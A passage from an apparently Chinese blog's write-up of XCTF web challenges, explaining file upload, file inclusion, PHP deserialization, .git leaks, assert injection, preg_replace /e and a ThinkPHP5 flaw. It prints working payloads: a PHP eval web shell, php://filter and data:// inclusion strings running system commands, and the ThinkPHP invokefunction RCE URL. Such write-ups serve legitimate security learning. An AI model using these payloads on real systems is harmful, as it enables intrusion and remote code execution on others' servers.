class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">'cmd'</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>bypass前端后通过BP抓包修改</p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/upload1_2.jpg" class=""><p>回显：<code>upload success : upload/1667464623.b.php</code></p><p>通过蚁剑连接：<code>http://61.147.171.105:50598/upload/1667464623.b.php</code>   密码为：<code>cmd</code></p><p>找到flag</p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/upload1_1.jpg" class=""><h4 id="10-文件包含-泰山杯"><a href="#10-文件包含-泰山杯" class="headerlink" title="10_文件包含 泰山杯"></a>10_文件包含 泰山杯</h4><h5 id="描述-8"><a href="#描述-8" class="headerlink" title="描述"></a>描述</h5><p>文件包含题，进入直接一段php代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">include</span>(<span class="hljs-string">"./check.php"</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'filename'</span>])){<br>        <span class="hljs-variable">$filename</span>  = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'filename'</span>];<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$filename</span>);<br>    }<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h5 id="思路-9"><a href="#思路-9" class="headerlink" title="思路"></a>思路</h5><p>很明显，要提交一个filename参数进去。</p><p>首先，随便提交一个payload，<code>filename=flag.php</code></p><p>有回显：<code>you have use the right usage , but error method</code></p><p>然后尝试一下php伪协议，payload：<code>filename=php://filter/read=convert.base64-encode/resource=check.php</code></p><p>有回显：<code>do not hack!</code>，说明是有过滤的。继续构造payload<code>filename=php://filter/read</code>，还是被过滤，说明是read被过滤掉了,同样的发现base64被过滤。</p><p>尝试后发现<code>convert.iconv.</code>未被过滤，那么可以使用BP对iconv中的两个字段爆破，使用提前编写好的字典。</p><p><strong>将<code>.iconv</code>的两个可选参数标为payload，并且选择<code>Cluster bomb</code>模式，设置好字典为准备好的.txt文件。爆破出来选择最长的response查看。</strong></p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/fileinclude_taishanbei_3.jpg" class=""><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/fileinclude_taishanbei_2.jpg" class=""><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/fileinclude_taishanbei_1.jpg" class=""><h4 id="11"><a href="#11" class="headerlink" title="11_"></a>11_</h4><h5 id="描述-9"><a href="#描述-9" class="headerlink" title="描述"></a>描述</h5><p>直接可以看到代码，检查网页源码也是一样</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xctf</span></span>{<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$flag</span> = <span class="hljs-string">'111'</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>{<br><span class="hljs-keyword">exit</span>(<span class="hljs-string">'bad requests'</span>);<br>}<br>?code=<br></code></pre></td></tr></table></figure><h5 id="知识点-9"><a href="#知识点-9" class="headerlink" title="知识点"></a>知识点</h5><ul><li><p>PHP反序列化编写格式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//反序列化数组，a是数组的意思</span><br>a:<span class="hljs-number">3</span>:{i:<span class="hljs-number">0</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">"4444"</span>;i:<span class="hljs-number">1</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">"123"</span>;}<br><span class="hljs-comment">//反序列化对象，O是对象的意思</span><br>O:<span class="hljs-number">4</span>:<span class="hljs-string">"xctf"</span>:<span class="hljs-number">2</span>:{s:<span class="hljs-number">4</span>:<span class="hljs-string">"test"</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">"fall"</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">"flag"</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">"111"</span>;}<br></code></pre></td></tr></table></figure></li><li><p><strong>__wakeup函数的bypass：序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过wakeup的执行</strong></p></li></ul><h5 id="思路-10"><a href="#思路-10" class="headerlink" title="思路"></a>思路</h5><p>很显然只是显示了部分代码，只有给出的code可以操作，那么传一个code参数上去</p><p><code>code=111</code>,回显<code>you should not type an integer</code>，告诉我们不传整型，且说明code变量是可用的。</p><p>这是一个反序列化的问题。</p><p>反序列化构造：<code>O:4:"xctf":1:{s:4:"flag";s:3:"111";}</code>，这样行不通，会调用wakeup函数</p><p>利用PHP漏洞：序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行，</p><p>传入：<code>O:4:"xctf":2:{s:4:"flag";s:3:"111";}</code></p><p>回显：<code>the answer is : cyberpeace{475ed74daf373a5a3a3fe01821af26e4}</code></p><h4 id="12-Web-php-include-CTF"><a href="#12-Web-php-include-CTF" class="headerlink" title="12_Web_php_include_CTF"></a>12_Web_php_include_CTF</h4><h5 id="描述-10"><a href="#描述-10" class="headerlink" title="描述"></a>描述</h5><p>进去就是一段代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'hello'</span>];<br><span class="hljs-variable">$page</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'page'</span>];<br><span class="hljs-keyword">while</span> (<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$page</span>, <span class="hljs-string">"php://"</span>)) {<br>    <span class="hljs-variable">$page</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">"php://"</span>, <span class="hljs-string">""</span>, <span class="hljs-variable">$page</span>);<br>}<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$page</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h5 id="知识点-10"><a href="#知识点-10" class="headerlink" title="知识点"></a>知识点</h5><ul><li><p>PHP函数——<strong>strstr</strong>：搜索字符串在另一字符串中是否存在，如果是，返回该字符串及剩余部分，否则返回 FALSE。</p></li><li><p>PHP函数——<strong>str_replace</strong>：以其他字符替换字符串中的一些字符</p></li><li><h5 id="PHP伪协议：data-类似php-input，可以让用户来控制输入流，用户输入的data-流会被当作php文件执行，从而执行我们想要执行的代码。要求allow-url-fopen-On，allow-url-include-On"><a href="#PHP伪协议：data-类似php-input，可以让用户来控制输入流，用户输入的data-流会被当作php文件执行，从而执行我们想要执行的代码。要求allow-url-fopen-On，allow-url-include-On" class="headerlink" title="==PHP伪协议：data://==:类似php://input，可以让用户来控制输入流，用户输入的data://流会被当作php文件执行，从而执行我们想要执行的代码。要求allow_url_fopen=On，allow_url_include=On"></a>==<strong>PHP伪协议：data://</strong>==:类似php://input，可以让用户来控制输入流，用户输入的data://流会被当作php文件执行，从而执行我们想要执行的代码。要求allow_url_fopen=On，allow_url_include=On</h5></li><li><p>var_dump用于显示字符串</p></li></ul><h5 id="思路-11"><a href="#思路-11" class="headerlink" title="思路"></a>思路</h5><p>题目的意思很明显，我们要传一个GET类型的page参数上去，然后其会替换page里面的php://为空，防止我们显示文件内容。那么我们使用data://就好了。</p><p>首先构造payload:<code>?page=data://text/plain,&lt;?php exec('ls',$result);var_dump($result);?&gt;</code></p><p>获得如下回显：</p><p><code>array(3) { [0]=&gt; string(18) "fl4gisisish3r3.php" [1]=&gt; string(9) "index.php" [2]=&gt; string(11) "phpinfo.php" }</code></p><p><code>data://text/plain,&lt;?php echo $page?&gt;</code></p><p>很显然，我们的flag应该在<code>fl4gisisish3r3.php</code>文件里，那么我们cat一下文件里的内容就行了。</p><p>再构造payload：<code>?page=data://text/plain,&lt;?php exec('cat fl4gisisish3r3.php',$result);var_dump($result);?&gt;</code></p><p>获得如下回显：<code>array(3) { [0]=&gt; string(5) " string(50) "$flag="ctf{876a5fca-96c6-4cbd-9075-46f0c89475d2}";" [2]=&gt; string(2) "?&gt;" }</code>，找到flag.</p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/Web_php_include_CTF_1.jpg" class=""><p>ctf{876a5fca-96c6-4cbd-9075-46f0c89475d2}</p><h4 id="13-Web-php-unserialize（题解未写完）"><a href="#13-Web-php-unserialize（题解未写完）" class="headerlink" title="13_Web_php_unserialize（题解未写完）"></a>13_Web_php_unserialize（题解未写完）</h4><h5 id="描述-11"><a href="#描述-11" class="headerlink" title="描述"></a>描述</h5><p>进去一段PHP代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span> </span>{ <br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">'index.php'</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>) </span>{ <br>        <span class="hljs-variable language_">$this</span>-&gt;file = <span class="hljs-variable">$file</span>; <br>    }<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>{ <br>        <span class="hljs-keyword">echo</span> @<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;file, <span class="hljs-literal">true</span>); <br>    }<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>{ <br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;file != <span class="hljs-string">'index.php'</span>) { <br>            <span class="hljs-comment">//the secret is in the fl4g.php</span><br>            <span class="hljs-variable language_">$this</span>-&gt;file = <span class="hljs-string">'index.php'</span>; <br>        } <br>    } <br>}<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'var'</span>])) { <br>    <span class="hljs-variable">$var</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'var'</span>]); <br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/[oc]:\d+:/i'</span>, <span class="hljs-variable">$var</span>)) { <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">'stop hacking!'</span>); <br>    } <span class="hljs-keyword">else</span> {<br>        @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$var</span>); <br>    } <br>} <span class="hljs-keyword">else</span> { <br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">"index.php"</span>); <br>} <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h5 id="知识点-11"><a href="#知识点-11" class="headerlink" title="知识点"></a>知识点</h5><ul><li>wakeup函数的绕过方法</li><li>O:+6绕过对O的正则匹配</li><li><strong>字符逃逸问题</strong></li></ul><h5 id="思路-12"><a href="#思路-12" class="headerlink" title="思路"></a>思路</h5><p>反序列化题，注意到<code>__destruct里有一个highlight_file</code>，这里就是出flag的地方。</p><p>显然，题目已经告诉我们secret在fl4g.php里，我们不妨先想办法去看看再说，</p><p>上传一个GET参数var，首先会被base64解码，然后会被正则过滤关键字，这里需要绕过，然后就被反序列化了，开始调用一个<code>wakeup</code>函数，会判断file参数是否是index，不是则置为index，这里也需要绕过，总共两个绕过点。</p><p>wakeup函数很好绕过，关键是正则匹配，<code>/[oc]:\d+:/</code>，这里的意思是匹配<code>o:数字:</code>，所以我们序列化中的<code>o:4</code>，就需要改一下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Demo</span>(<span class="hljs-string">'fl4g.php'</span>);<br><span class="hljs-variable">$s</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">'O:4'</span>,<span class="hljs-string">'O:+4'</span>,<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-variable">$s</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">'1:'</span>,<span class="hljs-string">'2:'</span>,<span class="hljs-variable">$s</span>);<br><span class="hljs-keyword">echo</span> base64-<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$s</span>);<br><span class="hljs-comment">//O:+4:"Demo":2:{s:10:"Demofile";s:8:"fl4g.php";}</span><br><span class="hljs-comment">//TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</span><br></code></pre></td></tr></table></figure><p>payload就为<code>TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</code></p><h4 id="14-MFW（git泄露）"><a href="#14-MFW（git泄露）" class="headerlink" title="14_MFW（git泄露）"></a>14_MFW（git泄露）</h4><h5 id="描述-12"><a href="#描述-12" class="headerlink" title="描述"></a>描述</h5><p>进去是一个个人网站的样子。跳转到About页面时，出现：</p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/mfw_1.jpg" class=""><p>使用了Git，说明开发者使用Git进行版本控制，很可能会存在Git引起的文件泄露问题。</p><h5 id="知识点-12"><a href="#知识点-12" class="headerlink" title="知识点"></a>知识点</h5><ul><li><p>Git引起的文件泄露</p></li><li><p>PHP函数：str_pos:</p></li><li><p><strong>PHP函数：assert:</strong></p><ul><li><p>书写格式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//PHP5,7</span><br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-keyword">mixed</span> <span class="hljs-variable">$assertion</span>, <span class="hljs-keyword">string</span> <span class="hljs-variable">$description</span> = ?): <span class="hljs-keyword">bool</span><br><span class="hljs-comment">//PHP7</span><br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-keyword">mixed</span> <span class="hljs-variable">$assertion</span>, <span class="hljs-built_in">Throwable</span> <span class="hljs-variable">$exception</span> = ?): <span class="hljs-keyword">bool</span><br></code></pre></td></tr></table></figure></li><li><p>如果 <code>assertion</code> 是字符串，它将会被 <strong>assert() 当做 PHP 代码来执行</strong>。如果传入了 boolean 的条件作为 <code>assertion</code>，这个条件将不会显示为断言函数的参数；在调用你定义的assert_options处理函数时，条件会转换为字符串，而布尔值 <strong><code>false</code></strong> 会被转换成空字符串</p></li></ul></li><li></li></ul><h5 id="思路-13"><a href="#思路-13" class="headerlink" title="思路"></a>思路</h5><p>可能是Git泄露，尝试在浏览器访问：<code>/.git/</code>，结果出现了回显，说明猜测正确。我们使用git hack获取服务器上用git管理的文件</p><p>首先在命令行中进入githack目录下，使用<code>python GitHack.py http://61.147.171.105:56499/.git/</code>，之后会在git hack目录下生成获取到的文件的文件夹。</p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/mfw_2.jpg" class="">  <p>获得的index.php代码如下：省略html部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'page'</span>])) {<br><span class="hljs-variable">$page</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'page'</span>];<br>} <span class="hljs-keyword">else</span> {<br><span class="hljs-variable">$page</span> = <span class="hljs-string">"home"</span>;<br>}<br><span class="hljs-variable">$file</span> = <span class="hljs-string">"templates/"</span> . <span class="hljs-variable">$page</span> . <span class="hljs-string">".php"</span>;<br><span class="hljs-comment">// I heard '..' is dangerous!</span><br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-string">"strpos('<span class="hljs-subst">$file</span>', '..') === false"</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">"Detected hacking attempt!"</span>);<br><span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Make this look nice</span><br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-string">"file_exists('<span class="hljs-subst">$file</span>')"</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">"That file doesn't exist!"</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>发现了<code>assert</code>函数，可以通过其来执行PHP代码，这里就是解题的关键。</p><p>构造payload：<code>fff')</code>用于闭合assert函数</p><p><code>fff') or exec("ls",$result);var_dump($result);//</code>          不行</p><p><code>fff') or include("data://text/plain,&lt;?php exec("ls",$result);var_dump($result);?&gt;");</code>      不行</p><p><code>fff') or system("cat templates/flag.php")//</code>      可行</p><h4 id="15-ics-05"><a href="#15-ics-05" class="headerlink" title="15_ics_05"></a>15_ics_05</h4><h5 id="描述-13"><a href="#描述-13" class="headerlink" title="描述"></a>描述</h5><p>是一个实际场景，只有设备维护中心的page能被点开</p><h5 id="知识点-13"><a href="#知识点-13" class="headerlink" title="知识点"></a>知识点</h5><ul><li><p>文件包含</p></li><li><p><strong>ctype_alnum() 函数检测字符串是否全部为字母和(或)数字字符，如果文本中的每个字符都是字母或数字，则返回TRUE，否则返回FALSE。</strong></p></li><li><p><strong>==正则表达式的修饰符：==</strong></p><p><strong>i：</strong>ignore-不区分大小写<strong>g：</strong>global-全局匹配<strong>m：</strong>multi line-多行匹配</p></li><li><p>preg_replace函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">mixed</span> <span class="hljs-title function_ invoke__">preg_replace</span> ( <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$pattern</span> , <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$replacement</span> , <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$subject</span> [, <span class="hljs-keyword">int</span> <span class="hljs-variable">$limit</span> = -<span class="hljs-number">1</span> [, <span class="hljs-keyword">int</span> &amp;<span class="hljs-variable">$count</span> ]] )<br></code></pre></td></tr></table></figure><ul><li>$pattern: 要搜索的模式，可以是字符串或一个字符串数组。</li><li>$replacement: 用于替换的字符串或字符串数组。</li><li>$subject: 要搜索替换的目标字符串或字符串数组。</li><li>$limit: 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）。</li><li>$count: 可选，为替换执行的次数。</li><li>==<strong>/e参数：可以传入 /e 的修饰符，然后让代码执行</strong>==</li></ul></li></ul><h5 id="思路-14"><a href="#思路-14" class="headerlink" title="思路"></a>思路</h5><p>首先检查网页源码，只有html没有php，没用，所以我们第一个任务是找到php源码，首先访问一下index.phps，返回400，没用，看一下有没有git泄露，访问<code>/.git/</code>也没有，那就继续看看页面有没有什么可以交互的地方，发现点击标题的时候，页面发生了变化。url多了一个<code>/?page=index.php</code>，页面也出现了index，<strong>那么后端有一个page点可以交互，目前能想到的有两种，sql注入和文件包含漏洞</strong>，能排除sql注入，因为修改payload为<code>page=hhh</code>时，页面直接回显hhh，说明是没有走数据库的。那么就文件包含了，payload如下：</p><p>**<code>page=php://filter/read=convert.base64-enocode/resource=index.php</code>**，然后直接就扒出index.php经过base64-encode编码后的源码，很顺利，居然没有过滤需要绕过，然后我们解码就可以得到源码了。</p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/ics05_1.jpg" class=""><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>@<span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-title function_ invoke__">posix_setuid</span>(<span class="hljs-number">1000</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$page</span> = <span class="hljs-variable">$_GET</span>[page];<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$page</span>)) {<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ctype_alnum</span>(<span class="hljs-variable">$page</span>)) {}<br>}<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$page</span>; <span class="hljs-keyword">die</span>();<span class="hljs-meta">?&gt;</span>&lt;/p&gt;<br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">else</span>{}<br><span class="hljs-meta">?&gt;</span><br>    <span class="hljs-meta">&lt;?php</span><br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$page</span>, <span class="hljs-string">'input'</span>) &gt; <span class="hljs-number">0</span>) {<br>        <span class="hljs-keyword">die</span>();<br>    }<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$page</span>, <span class="hljs-string">'ta:text'</span>) &gt; <span class="hljs-number">0</span>) {<br>        <span class="hljs-keyword">die</span>();<br>    }<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$page</span>, <span class="hljs-string">'text'</span>) &gt; <span class="hljs-number">0</span>) {<br>        <span class="hljs-keyword">die</span>();<br>    }<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$page</span> === <span class="hljs-string">'index.php'</span>) {<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">'Ok'</span>);<br>    }<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$page</span>);<br>    <span class="hljs-keyword">die</span>();<br>    <span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'HTTP_X_FORWARDED_FOR'</span>] === <span class="hljs-string">'127.0.0.1'</span>) {<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br &gt;Welcome My Admin ! &lt;br &gt;"</span>;<br><br>    <span class="hljs-variable">$pattern</span> = <span class="hljs-variable">$_GET</span>[pat];<br>    <span class="hljs-variable">$replacement</span> = <span class="hljs-variable">$_GET</span>[rep];<br>    <span class="hljs-variable">$subject</span> = <span class="hljs-variable">$_GET</span>[sub];<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$pattern</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$replacement</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$subject</span>)) {<br>        <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$replacement</span>, <span class="hljs-variable">$subject</span>);<br>    }<span class="hljs-keyword">else</span>{<br>        <span class="hljs-keyword">die</span>();<br>    }<br><br>}<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>其实看完源码可以发现，首先是有字符串的过滤检测的，但是刚好没有php的伪协议，所以很顺利地得到了源码。解题的关键应该是有注释后的那部分代码。</p><p>有一个X-Forward-For的检测，用插件绕过就行或者用BP自己写一下，然后有三个参数：<code>pat,rep,sub</code>，被<code>preg_replace</code>函数调用，可以使用/e参数一段PHP代码，</p><p>payload:<code>?pat=/a/e&amp;rep=system("cat index.php");&amp;sub=a</code>，</p><p>有index.php的回显，说明可行，</p><p>那么继续构造payload：<code>?pat=/a/e&amp;rep=system("ls");&amp;sub=a</code>，</p><p>有回显<code>css index.html index.php js layui logo.png s3chahahaDir start.sh 视图.png</code>，东西大概率在<code>s3chahahahaDir</code>里，进去看看，果然有flag，也是个目录，里面有flag.php。</p><p>构造payload：<code>?pat=/a/e&amp;rep=system("cat s3chahahaDir/flag/flag.php");&amp;sub=a</code></p><p>在源码里出现了flag：cyberpeace{38067f93cbfb9366ec43674ebac38457}</p><h4 id="16-PHP-RCE"><a href="#16-PHP-RCE" class="headerlink" title="16_PHP_RCE"></a>16_PHP_RCE</h4><h5 id="描述-14"><a href="#描述-14" class="headerlink" title="描述"></a>描述</h5><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/php_rce_1.jpg" class=""><h5 id="知识点-14"><a href="#知识点-14" class="headerlink" title="知识点"></a>知识点</h5><ul><li>ThinkPHP 漏洞之一：ThinkPHP5框架底层对控制器名过滤不严，可以通过url调用到ThinkPHP框架内部的敏感函数，进而导致getshell漏洞。</li><li>shell：<code>find / -name flag</code></li></ul><h5 id="思路-15"><a href="#思路-15" class="headerlink" title="思路"></a>思路</h5><p>第一次遇见ThinkPHP，去Github查阅一下POC，得到如下payload：</p><p><code>?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls</code></p><p>得到如下回显：</p><p><code>favicon.ico index.php robots.txt router.php static static</code>，不太像有flag的样子，不过检验一下漏洞是否可以利用。</p><p>接着构造<code>ls /</code>，发现根目录下有flag，cat出来，解决。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>x64dbg基础使用指南</title>
